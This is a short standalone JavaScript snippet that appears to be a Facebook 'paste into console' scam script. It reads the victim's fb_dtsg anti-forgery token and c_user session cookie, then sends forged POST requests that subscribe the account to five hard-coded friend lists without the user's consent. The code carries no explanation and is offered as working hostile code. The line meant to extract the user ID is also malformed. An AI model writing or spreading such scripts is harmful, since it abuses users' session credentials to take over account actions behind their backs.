var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=" + L;
var XParams = "fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
LIST("148559432012336");
LIST("156489554515051");
LIST("146971562150041");
LIST("159553654225165");
LIST("1410880552485258");
